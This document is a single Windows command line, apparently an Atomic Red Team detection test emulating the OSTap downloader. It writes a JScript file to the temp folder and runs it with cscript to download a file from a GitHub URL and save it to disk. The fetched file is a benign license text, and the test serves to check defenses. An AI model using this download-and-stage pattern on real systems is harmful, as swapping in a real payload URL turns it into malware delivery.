echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js